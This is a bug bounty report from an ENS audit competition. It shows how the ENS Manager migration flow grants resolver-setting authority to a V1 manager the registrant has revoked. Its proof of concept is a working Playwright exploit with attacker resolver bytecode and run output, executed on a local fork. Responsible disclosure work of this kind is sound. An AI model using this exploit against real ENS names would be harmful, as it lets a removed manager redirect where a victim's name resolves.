# 92489 w a medium apps manager migration grants role set resolver to a revoked v1 manager

## #92489 \[W\&A-Medium] apps/manager: migration grants ROLE\_SET\_RESOLVER to a revoked V1 manager

**Submitted on Sep 10th 2026 at 09:03:06 UTC by @zaaf for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92489
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

### Description

`classifyName` copies `domain.owner.id` — the V1 Registry manager as it stood when the migration page last fetched V1 names — into `managerAddress`, and the migration plan turns that address into a non-expiring V2 `grantRoles(resource, ROLE_SET_RESOLVER, managerAddress)` call. Nothing between that capture and the signed transaction reads `ENSRegistry.owner(namehash(name))` again. A registrant who reclaims a name away from its V1 manager and then upgrades from the migration page they already have open therefore signs a batch that hands the removed manager resolver-setting authority over the V2 name, and that account can then point the name at a resolver of its own. Commit `cda79aca` is the Immunefi fork's snapshot of the audited upstream revision: its commit message reads `fork ensdomains/apps-monorepo at 63772fd872af472ced58b009499355f3430c2a86`, the revision named on the competition's Resources page.

## Vulnerability Details

For an unwrapped `.eth` name whose Registry owner differs from its registrant, `classifyName` derives `managerAddress` from the fetched domain object. `buildRoleGrantCall` encodes that address into `grantRoles(resource, ROLE_SET_RESOLVER, managerAddress)`, and `buildAtomicMigrationBatches` adds it to the batch as a `manager-role-grant` inner execution. That role carries no expiry. It is still held once the flow reports success, and only the registration owner can take it back.

`MigrationPage` hands `gasEstimate.plan` — the plan object built earlier — straight to `migration.start`. Three things then fail to notice that the manager has changed:

* `useMigrationGasEstimate` keys its query on `['migration-gas-estimate', ownerAddress, hcaAddress, domainIds, revision]`. The manager address is not part of that key, and `revision` only increments when the set of selected domain ids changes. A changed manager therefore produces the same key and the same cached plan until something triggers a refetch.
* `assertMigrationApprovalPlanCurrent` does re-check permissions before the first wallet prompt, but it derives both sides of its comparison from the plan it was given: `getMissingMigrationApprovals` computes `requiresManagerRestoration` from `plan.classified`. A manager change moves both sides together, so this guard cannot fire on it.
* The retry path is the only place that reconciles against the chain, and `assertSourceTokensOwnedForRetry` reads `BaseRegistrar.ownerOf` — the registrant who holds the ERC-721 — which is deliberately independent of the Registry manager.

`managerAddress` also never reaches a component: it appears only in `classifyNames.ts`, `buildRoleGrantCalls.ts`, `buildAtomicMigrationBatches.ts`, `computeMigrationPreflight.ts` and `migrationService.ts`. The owner is shown a name list and a fee estimate, not the address the batch re-authorises.

**Missing control:** before each `manager-role-grant` call is built and again before the batch is submitted, read `ENSRegistry.owner(namehash(name))` and require it to equal the address embedded in the grant. A mismatch must rebuild the plan and the confirmation data, or abort the submission.

**Where:** `packages/migration/src/service/classifyNames.ts:162-184` captures the address; `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:11-27` encodes it; `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:607-625` persists it; `apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts:81-89` keys the cached plan without it; `apps/manager/src/features/migration/pages/MigrationPage.tsx:263-282` submits that plan; `apps/manager/src/features/migration/service/migrationService.ts:338-390` re-checks approvals derived from the same plan; `apps/manager/src/features/migration/service/migrationService.ts:705-730` reconciles the token holder rather than the manager.

**Discriminating control:** two names go through the same flow, the same wallet and the same contracts. Both are managed by A, then reclaimed to B before submission, and both read B from `ENSRegistry.owner` at submission. The V1 names endpoint is answered from `ENSRegistry.owner` at the moment of each request, so any fetch after the reclaim returns B; the reproduction counts how many the application performs. The only difference between the arms is whether the page was given a query trigger after the reclaim. Without one it performs **zero** fetches, submits the plan it already holds, and A receives `ROLE_SET_RESOLVER`. With one it performs three, rebuilds the plan, and B receives the role while A's identical `setResolver` reverts.

**Excluded-premise check:** the run needs no leaked key, no privileged ENS address, no browser defect, no phishing and no contract defect. It also does not depend on any indexer being stale or wrong. The endpoint that supplies V1 names is answered directly from `ENSRegistry.owner`, so it cannot report anything but the current manager; in the vulnerable arm the application simply never asks it again. The only stale value in the system is the plan the application is holding. The local environment is the repository's own `pnpm e2e:infra:up` stack; two BaseRegistrar and ETHRegistry storage slots are temporarily set so the test wallet can create its own names, and both are restored before the reclaim, the plan, the migration and the readback.

## Impact Details

The registration stays with the victim — `getState().latestOwner` is unchanged — but resolver authority over the migrated name does not. Migration restores `ROLE_SET_RESOLVER` to the address the registrant removed. That account then deploys its own resolver, points the victim's name at it, and the name resolves to an address the removed manager chose. Those later calls raise no request in the victim's wallet and need no further victim interaction.

**Attacker:** an ordinary account that was the name's V1 Registry manager and was removed by the registrant's own `BaseRegistrar.reclaim(tokenId, B)` transaction. It holds no ENS privilege, no role inside the victim's account, and takes no action before the migration.

**Victim:** the `.eth` registrant, who opens the Manager migration page, revokes the old manager, and completes the upgrade the page has already prepared.

**Gain (measured):** `hasRoles(resource, ROLE_SET_RESOLVER, A)` returns `true` on the migrated name once the flow reports success. A then deploys a resolver of its own with an ordinary transaction and `setResolver(resource, <that contract>)` succeeds, replacing `0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0`. Resolving the victim's name the way any client does — ask `getResolver` which resolver serves it, then ask that resolver for the address — returns `0x00000000000000000000000000000000000C33c3`, the address A chose. On the control name A holds no role, the identical `setResolver` reverts, the resolver is unchanged, and the same resolution returns the zero address.

**Executed end-to-end:** yes — through the Manager application in a browser, on a local Sepolia fork, from the dashboard Upgrade button to resolving the victim's name and reading back the attacker's address. Nothing was broadcast to a public network.

**Verified out of band:** every value in the output is a direct contract read taken after the UI reported success: `ENSRegistry.owner` for the live manager, `ETHRegistry.hasRoles` for both managers on both names, `ETHRegistry.getResolver` before and after A's write, and a call to the resolver that `getResolver` names.

Two limits belong with that result. The role is non-expiring but owner-revocable: `revokeRoles(resource, ROLE_SET_RESOLVER, A)` sent from the registration owner succeeds, `hasRoles` then returns `false`, and A's next `setResolver` reverts — measured on the same fork. The resolver A already installed is not undone by that revocation and has to be set back separately, so the name keeps resolving to A's address until the owner notices and acts. And the window is bounded by the next event that makes the page refetch V1 names and rebuild its plan; the control arm is that event.

## References

* [`classifyName` copies `domain.owner.id` into `managerAddress`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/classifyNames.ts#L160-L186)
* [`buildRoleGrantCall` encodes it as a persistent `ROLE_SET_RESOLVER` grant](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L9-L27)
* [The atomic batch carries it as `manager-role-grant`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L605-L625)
* [The gas-estimate query key omits the manager](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L79-L92)
* [The page submits the plan it already holds](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L263-L282)
* [Pre-submit validation compares approvals derived from that same plan](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L338-L390)
* [Retry reconciliation reads `BaseRegistrar.ownerOf`, not the Registry manager](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L705-L735)

### Proof of Concept

Both arms of the reproduction run in the Manager application itself: the browser loads `http://localhost:3000`, the migration is started from the dashboard Upgrade button, and the batch is signed by the repository's own headless wallet fixture. The V1 names endpoint is answered locally because the names exist only on the fork, and it is answered from `ENSRegistry.owner` at the moment of each request, so it cannot report anything but the current manager and the run does not depend on any indexing delay. The reproduction counts how many times the application actually asks. `02-migration-poc-terminal.png` is a screen capture of the run whose output is quoted in step 7.

**Prerequisites:** Docker, Node 22, pnpm 10. The whole run is local; no transaction reaches a public network.

1. **Owner/reviewer:** run `git clone`, `git checkout`, `pnpm install --frozen-lockfile` and `pnpm e2e:infra:up` to bring up the repository's own local chain at the audited commit.

```sh
git clone https://github.com/immunefi-team/audit-comp-ens.git ens-manager-repro
cd ens-manager-repro
git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596
pnpm install --frozen-lockfile
pnpm e2e:infra:up
```

If a non-anvil service reports that it missed its health deadline, continue; this reproduction uses the chain and the Manager app only.

2. **Owner/reviewer:** run `cp` and `bash e2e/infra/scripts/fund-*.sh` to apply the repository's own local environment files and fund the test accounts, exactly as `.github/workflows/e2e.yml` does.

```sh
cp apps/manager/.env.ci apps/manager/.env
cp e2e/.env.ci e2e/.env
bash e2e/infra/scripts/fund-rhinestone-account.sh
bash e2e/infra/scripts/fund-account.sh 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```

3. **Owner/reviewer:** run `pnpm --filter manager dev -- --port 3000` and leave the Manager app running in this shell.

```sh
pnpm --filter manager dev -- --port 3000
```

Wait until `curl -sf http://localhost:3000 > /dev/null` succeeds. Use a second shell for the remaining steps.

4. **Owner/reviewer:** run `cat` to create the Playwright project that runs the two arms; the repository's own manager config excludes migration specs, so this adds one that does not.

```sh
cat > e2e/projects/manager/playwright.stale.config.ts <<'TS'
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../playwright.config.base.js'

export default defineConfig({
  ...baseConfig,
  timeout: 420_000,
  testDir: './tests',
  use: {
    ...baseConfig.use,
    baseURL: process.env.MANAGER_APP_URL ?? 'http://localhost:3000',
  },
  projects: [
    {
      name: 'manager-stale-manager',
      testMatch: /stale-manager-ui\.spec\.ts$/,
    },
  ],
})
TS
```

5. **Owner/reviewer:** run `cat` to create the reproduction spec. Both arms are the same code path; `arm.rebuild` is the single difference.

```sh
cat > e2e/projects/manager/tests/stale-manager-ui.spec.ts <<'TS'
/**
 * The Manager migration flow grants V2 resolver authority to a V1 Registry
 * manager the registrant has already revoked.
 *
 * At the moment the owner clicks Upgrade, everything the app can still read
 * says the manager is B: the chain says B and the V1 names endpoint says B.
 * The only thing that still says A is the migration plan the page built
 * earlier and never rebuilds.
 *
 * The two tests differ in exactly one step: the control gives the page a query
 * trigger (a fresh visit) after the revocation, so it rebuilds its plan.
 */
import {
  type Address,
  encodeAbiParameters,
  encodeFunctionData,
  keccak256,
  namehash,
  getAddress,
  parseAbi,
  toHex,
  zeroAddress,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import {
  authorizeTransaction,
  expect,
  test,
} from '../../../fixtures/playwright.manager.fixture.js'
import {
  publicClient,
  testClient,
  walletClient,
} from '../../../helpers/anvil-client.js'

const APP = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'

const V1_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e' as Address
const V1_BASE_REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85' as Address
const V1_RESOLVER = '0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f' as Address
const V2_ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as Address
const V2_MIGRATION_HELPER = '0xddC597d937618849348E18Db5D631Ce747bCDeEF' as Address
const STANDALONE_HCA = '0x48B9c6898baFc8A3D3a495BF7c44CF3351486628' as Address

const ROLE_SET_RESOLVER = 1n << 24n
// Anvil accounts 1 and 2: A is the manager the owner revokes, B replaces it.
const MANAGER_A = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' as Address
const MANAGER_B = '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC' as Address
// The address the attacker wants the victim's name to resolve to.
const A_PAYOUT_ADDRESS = getAddress('0x00000000000000000000000000000000000c33c3')

/**
 * Deployment bytecode for a 41-byte resolver that answers every call with one
 * word: A_PAYOUT_ADDRESS. The attacker deploys it with an ordinary
 * transaction - no cheat code and no privileged access.
 *
 *   runtime : PUSH32 <addr> PUSH1 00 MSTORE PUSH1 20 PUSH1 00 RETURN
 *   initcode: copy the 0x29 runtime bytes from offset 0x0c and return them
 */
const attackerResolverInitCode = (): `0x${string}` => {
  const word = A_PAYOUT_ADDRESS.slice(2).toLowerCase().padStart(64, '0')
  const runtime = `7f${word}6000526020600 0f3`.replace(/ /g, '')
  const len = (runtime.length / 2).toString(16).padStart(2, '0')
  return `0x60${len}600c60003960${len}6000f3${runtime}` as `0x${string}`
}

const registrarAbi = parseAbi([
  'function register(uint256 id,address owner,uint256 duration) returns (uint256)',
  'function reclaim(uint256 id,address owner)',
  'function approve(address to,uint256 tokenId)',
  'function controllers(address account) view returns (bool)',
  'function nameExpires(uint256 id) view returns (uint256)',
])
const registryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
])
const resolverAbi = parseAbi([
  'function addr(bytes32 node) view returns (address)',
])
const registryV2Abi = parseAbi([
  'function register(string label,address owner,address registry,address resolver,uint256 roles,uint64 expiry) returns (uint256)',
  'function setApprovalForAll(address operator,bool approved)',
  'function hasRoles(uint256 resource,uint256 roles,address account) view returns (bool)',
  'function setResolver(uint256 resource,address resolver)',
  'function getResolver(string label) view returns (address)',
])

type Account = ReturnType<typeof privateKeyToAccount>

const send = async (account: Account, to: Address, data: `0x${string}`) => {
  const hash = await walletClient.sendTransaction({
    account,
    to,
    data,
    gas: 6_000_000n,
  })
  return publicClient.waitForTransactionReceipt({ hash })
}

const registryManager = (node: `0x${string}`) =>
  publicClient.readContract({
    address: V1_REGISTRY,
    abi: registryAbi,
    functionName: 'owner',
    args: [node],
  })

/**
 * Creates a .eth registration on the same V1 registrar and V2 registry the
 * audited build reads, then restores the two fixture storage slots that made
 * the registration possible. Nothing the finding depends on runs while they
 * are modified.
 */
async function seedName(owner: Account, label: string) {
  let controllerSlot: `0x${string}` | undefined
  let previousController: `0x${string}` | undefined
  for (let mappingSlot = 0n; mappingSlot < 20n; mappingSlot += 1n) {
    const candidate = keccak256(
      encodeAbiParameters(
        [{ type: 'address' }, { type: 'uint256' }],
        [owner.address, mappingSlot],
      ),
    )
    const previous = await publicClient.getStorageAt({
      address: V1_BASE_REGISTRAR,
      slot: candidate,
    })
    await testClient.setStorageAt({
      address: V1_BASE_REGISTRAR,
      index: candidate,
      value: toHex(1n, { size: 32 }),
    })
    const enabled = await publicClient.readContract({
      address: V1_BASE_REGISTRAR,
      abi: registrarAbi,
      functionName: 'controllers',
      args: [owner.address],
    })
    if (enabled) {
      controllerSlot = candidate
      previousController = previous
      break
    }
    await testClient.setStorageAt({
      address: V1_BASE_REGISTRAR,
      index: candidate,
      value: previous ?? toHex(0n, { size: 32 }),
    })
  }
  if (!controllerSlot) throw new Error('BaseRegistrar controller slot not found')

  const rootRoles = keccak256(
    encodeAbiParameters([{ type: 'uint256' }, { type: 'uint256' }], [0n, 2n]),
  )
  const registrarSlot = keccak256(
    encodeAbiParameters(
      [{ type: 'address' }, { type: 'bytes32' }],
      [owner.address, rootRoles],
    ),
  )
  const previousRoles = await publicClient.getStorageAt({
    address: V2_ETH_REGISTRY,
    slot: registrarSlot,
  })
  await testClient.setStorageAt({
    address: V2_ETH_REGISTRY,
    index: registrarSlot,
    value: toHex(BigInt(previousRoles ?? '0x0') | 1n, { size: 32 }),
  })

  const tokenId = BigInt(keccak256(toHex(label)))
  expect(
    (
      await send(
        owner,
        V1_BASE_REGISTRAR,
        encodeFunctionData({
          abi: registrarAbi,
          functionName: 'register',
          args: [tokenId, owner.address, 31_536_000n],
        }),
      )
    ).status,
  ).toBe('success')
  const expiry = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: registrarAbi,
    functionName: 'nameExpires',
    args: [tokenId],
  })
  expect(
    (
      await send(
        owner,
        V2_ETH_REGISTRY,
        encodeFunctionData({
          abi: registryV2Abi,
          functionName: 'register',
          args: [label, zeroAddress, zeroAddress, V1_RESOLVER, 0n, expiry],
        }),
      )
    ).status,
  ).toBe('success')

  await testClient.setStorageAt({
    address: V1_BASE_REGISTRAR,
    index: controllerSlot,
    value: previousController ?? toHex(0n, { size: 32 }),
  })
  await testClient.setStorageAt({
    address: V2_ETH_REGISTRY,
    index: registrarSlot,
    value: previousRoles ?? toHex(0n, { size: 32 }),
  })
  return { tokenId, expiry }
}

/**
 * Answers the V1 names endpoint the audited build calls. The manager it reports
 * is not a value this test holds: every request reads ENSRegistry.owner from
 * the chain at the moment it is served, so the endpoint is current by
 * construction and cannot be steered by the test. `hits` counts how many times
 * the application actually asked.
 */
async function serveV1Names(
  page: import('@playwright/test').Page,
  label: string,
  registrant: Address,
  expiry: bigint,
  hits: { count: number },
) {
  const name = `${label}.eth`
  const node = namehash(name)
  await page.route('**/v1-graphql.ens.dev/subgraph', async (route, request) => {
    if (!request.postData()?.includes('getNamesForAddress')) {
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ data: { domains: [] } }),
      })
    }
    hits.count += 1
    const liveManager = await registryManager(node)
    return route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        data: {
          domains: [
            {
              id: node,
              labelName: label,
              labelhash: keccak256(toHex(label)),
              name,
              resolver: null,
              owner: { id: liveManager },
              registrant: { id: registrant },
              wrappedOwner: null,
              parent: { name: 'eth', wrappedDomain: null },
              registration: { expiryDate: expiry.toString() },
              wrappedDomain: null,
            },
          ],
        },
      }),
    })
  })
}

async function openMigrationPage(page: import('@playwright/test').Page) {
  await page.goto(`${APP}/dashboard`)
  await page.waitForLoadState('networkidle')
  const entry = page.getByRole('button', { name: 'Upgrade Names' }).first()
  await entry.waitFor({ state: 'visible', timeout: 60_000 })
  await entry.click()
  const confirm = page.getByRole('button', { name: /Upgrade \d+ name/i })
  await confirm.waitFor({ state: 'visible', timeout: 60_000 })
  await expect(confirm).toBeEnabled({ timeout: 90_000 })
  return confirm
}

test.describe('Manager migration and a revoked V1 manager', () => {
  test.describe.configure({ timeout: 420_000 })

  for (const arm of [
    { name: 'stale plan: the revoked manager is granted the resolver role', rebuild: false },
    { name: 'control: a rebuilt plan grants only the current manager', rebuild: true },
  ]) {
    test(arm.name, async ({ migrationConnectedPage: page, wallet, accounts }) => {
      const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
      const revoked = privateKeyToAccount(accounts.getPrivateKey('user2'))
      expect(revoked.address).toBe(MANAGER_A)

      const label = `${arm.rebuild ? 'ctl' : 'stale'}-${Date.now()}`
      const name = `${label}.eth`
      const node = namehash(name)
      const { tokenId, expiry } = await seedName(owner, label)

      // The owner delegates management of the name to A.
      expect((await send(owner, V1_BASE_REGISTRAR, encodeFunctionData({
        abi: registrarAbi, functionName: 'reclaim', args: [tokenId, MANAGER_A],
      }))).status).toBe('success')
      expect(await registryManager(node)).toBe(MANAGER_A)

      // The two permissions the migration flow asks the owner for.
      expect((await send(owner, V1_BASE_REGISTRAR, encodeFunctionData({
        abi: registrarAbi, functionName: 'approve', args: [V2_MIGRATION_HELPER, tokenId],
      }))).status).toBe('success')
      expect((await send(owner, V2_ETH_REGISTRY, encodeFunctionData({
        abi: registryV2Abi, functionName: 'setApprovalForAll', args: [STANDALONE_HCA, true],
      }))).status).toBe('success')

      // The V1 names endpoint answers from the chain, whatever it currently says.
      const hits = { count: 0 }
      await serveV1Names(page, label, owner.address, expiry, hits)

      // The owner opens the migration page; the page builds its plan.
      let confirm = await openMigrationPage(page)

      // The owner revokes A and hands management to B. From here on, any fetch
      // of the V1 names endpoint returns B, because the endpoint reads the
      // chain. Count how many the application performs before it submits.
      expect((await send(owner, V1_BASE_REGISTRAR, encodeFunctionData({
        abi: registrarAbi, functionName: 'reclaim', args: [tokenId, MANAGER_B],
      }))).status).toBe('success')
      const hitsBeforeSubmit = hits.count
      const liveManagerAtSubmission = await registryManager(node)
      expect(liveManagerAtSubmission).toBe(MANAGER_B)

      // Control arm only: a fresh visit is the query trigger that makes the
      // page rebuild its plan from the current endpoint.
      if (arm.rebuild) confirm = await openMigrationPage(page)
      const freshFetchesAfterRevocation = hits.count - hitsBeforeSubmit

      await Promise.all([confirm.click(), authorizeTransaction(wallet, 150_000)])
      await page
        .getByRole('button', { name: /Open dashboard/i })
        .waitFor({ state: 'visible', timeout: 240_000 })

      // Read the resulting authority and resolver straight from the chain.
      const resource = labelToCanonicalId(label)
      const hasRole = (account: Address) =>
        publicClient.readContract({
          address: V2_ETH_REGISTRY, abi: registryV2Abi,
          functionName: 'hasRoles', args: [resource, ROLE_SET_RESOLVER, account],
        })
      const resolverOf = () =>
        publicClient.readContract({
          address: V2_ETH_REGISTRY, abi: registryV2Abi,
          functionName: 'getResolver', args: [label],
        })

      const resolverBefore = await resolverOf()
      await testClient.setBalance({ address: MANAGER_A, value: 10n ** 19n })

      // The attacker deploys a resolver that answers with an address it chose.
      const deployHash = await walletClient.sendTransaction({
        account: revoked, data: attackerResolverInitCode(), gas: 1_000_000n,
      })
      const deployReceipt = await publicClient.waitForTransactionReceipt({ hash: deployHash })
      const attackerResolver = getAddress(deployReceipt.contractAddress as string)
      expect(deployReceipt.status).toBe('success')

      const attempt = await send(revoked, V2_ETH_REGISTRY, encodeFunctionData({
        abi: registryV2Abi, functionName: 'setResolver',
        args: [resource, attackerResolver],
      }))

      // Resolve the victim's name the way any client does: ask the registry
      // which resolver serves it, then ask that resolver for the address.
      const resolveName = async () => {
        const r = await resolverOf()
        try {
          return await publicClient.readContract({
            address: r, abi: resolverAbi, functionName: 'addr', args: [node],
          })
        } catch {
          return 'call reverted'
        }
      }

      const result = {
        arm: arm.rebuild ? 'control (plan rebuilt)' : 'test (plan not rebuilt)',
        name,
        liveRegistryManagerAtSubmission: liveManagerAtSubmission,
        freshV1NamesFetchesAfterRevocation: freshFetchesAfterRevocation,
        revokedManagerHasSetResolverRole: await hasRole(MANAGER_A),
        currentManagerHasSetResolverRole: await hasRole(MANAGER_B),
        resolverBefore,
        revokedManagerSetResolver: attempt.status,
        resolverAfter: await resolverOf(),
        nameResolvesTo: await resolveName(),
        attackerChoseAddress: A_PAYOUT_ADDRESS,
      }
      console.log(`RESULT ${JSON.stringify(result, null, 2)}`)

      if (arm.rebuild) {
        expect(result.revokedManagerHasSetResolverRole).toBe(false)
        expect(result.currentManagerHasSetResolverRole).toBe(true)
        expect(result.revokedManagerSetResolver).toBe('reverted')
        expect(result.resolverAfter).toBe(resolverBefore)
        expect(result.nameResolvesTo).not.toBe(A_PAYOUT_ADDRESS)
      } else {
        expect(result.revokedManagerHasSetResolverRole).toBe(true)
        expect(result.currentManagerHasSetResolverRole).toBe(false)
        expect(result.revokedManagerSetResolver).toBe('success')
        expect(result.resolverAfter).toBe(attackerResolver)
        expect(result.nameResolvesTo).toBe(A_PAYOUT_ADDRESS)
      }
    })
  }
})
TS
```

6. **Owner/reviewer:** run `npx playwright test --config=projects/manager/playwright.stale.config.ts` to execute both arms.

```sh
cd e2e && npx playwright test --config=projects/manager/playwright.stale.config.ts
```

Each arm, in order: the owner (Anvil account 0, the wallet connected in the browser) registers a `.eth` name and reserves it in V2; the owner sets the V1 Registry manager to A (Anvil account 1) with `BaseRegistrar.reclaim`; the owner grants the two permissions the migration flow asks for; the browser opens `/dashboard`, clicks **Upgrade Names**, and waits for the fee estimate; the owner then sends `BaseRegistrar.reclaim(tokenId, B)` (Anvil account 2), so every later answer from the names endpoint is B; the test asserts `ENSRegistry.owner` is B and starts counting the application's fetches; the control arm alone revisits `/dashboard` so the page rebuilds its plan; the browser clicks **Upgrade N name** and the wallet signs; after the success dialog A deploys a resolver of its own, calls `setResolver`, and the name is resolved the way any client resolves it — `getResolver` for the resolver, then that resolver for the address.

7. **Owner/reviewer:** compare the output against the block below; the run prints one `RESULT` object per arm and two passing tests.

```
Running 2 tests using 1 worker

[mock-indexer] E2E_MOCK_INDEXER=true — intercepting indexer requests
[manager-auth] BackendAuthModal visible — clicking "Skip for now"
[manager-auth] BackendAuthModal dismissed
RESULT {
  "arm": "test (plan not rebuilt)",
  "name": "stale-1789029687508.eth",
  "liveRegistryManagerAtSubmission": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "freshV1NamesFetchesAfterRevocation": 0,
  "revokedManagerHasSetResolverRole": true,
  "currentManagerHasSetResolverRole": false,
  "resolverBefore": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0",
  "revokedManagerSetResolver": "success",
  "resolverAfter": "0xB3b3Cd58EA0F649d68B4eA493765193E9C1865bb",
  "nameResolvesTo": "0x00000000000000000000000000000000000C33c3",
  "attackerChoseAddress": "0x00000000000000000000000000000000000C33c3"
}
  ✓  1 [manager-stale-manager] › projects/manager/tests/stale-manager-ui.spec.ts:290:5 › Manager migration and a revoked V1 manager › stale plan: the revoked manager is granted the resolver role (27.5s)
[mock-indexer] E2E_MOCK_INDEXER=true — intercepting indexer requests
[manager-auth] BackendAuthModal visible — clicking "Skip for now"
[manager-auth] BackendAuthModal dismissed
RESULT {
  "arm": "control (plan rebuilt)",
  "name": "ctl-1789029714757.eth",
  "liveRegistryManagerAtSubmission": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "freshV1NamesFetchesAfterRevocation": 3,
  "revokedManagerHasSetResolverRole": false,
  "currentManagerHasSetResolverRole": true,
  "resolverBefore": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0",
  "revokedManagerSetResolver": "reverted",
  "resolverAfter": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0",
  "nameResolvesTo": "0x0000000000000000000000000000000000000000",
  "attackerChoseAddress": "0x00000000000000000000000000000000000C33c3"
}
  ✓  2 [manager-stale-manager] › projects/manager/tests/stale-manager-ui.spec.ts:290:5 › Manager migration and a revoked V1 manager › control: a rebuilt plan grants only the current manager (35.8s)

  2 passed (1.1m)
```

The name labels, the deployed resolver address and the elapsed times change per run; every other value is fixed. `liveRegistryManagerAtSubmission` is `0x3C44CdDd…` (B) in both arms, so the arms differ only in which plan was submitted. In the test arm the application performed **0** fetches of the names endpoint after the revocation, the removed manager A holds `ROLE_SET_RESOLVER`, `resolverAfter` is the resolver A deployed, and `nameResolvesTo` is the address A chose. In the control arm it performed 3, A holds nothing, A's identical call reverts, `resolverAfter` equals `resolverBefore`, and the name resolves to the zero address.

8. **Owner/reviewer:** run `pnpm e2e:infra:down` and `rm -f` to tear the environment down and remove the two files.

```sh
cd .. && pnpm e2e:infra:down
rm -f e2e/projects/manager/playwright.stale.config.ts e2e/projects/manager/tests/stale-manager-ui.spec.ts
```

**Recovery, measured on the same fork:** with the registration owner as sender, `revokeRoles(resource, ROLE_SET_RESOLVER, A)` on `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2` succeeds, `hasRoles` then returns `false`, and A's next `setResolver` reverts. The resolver value A already wrote stays until it is set back separately.
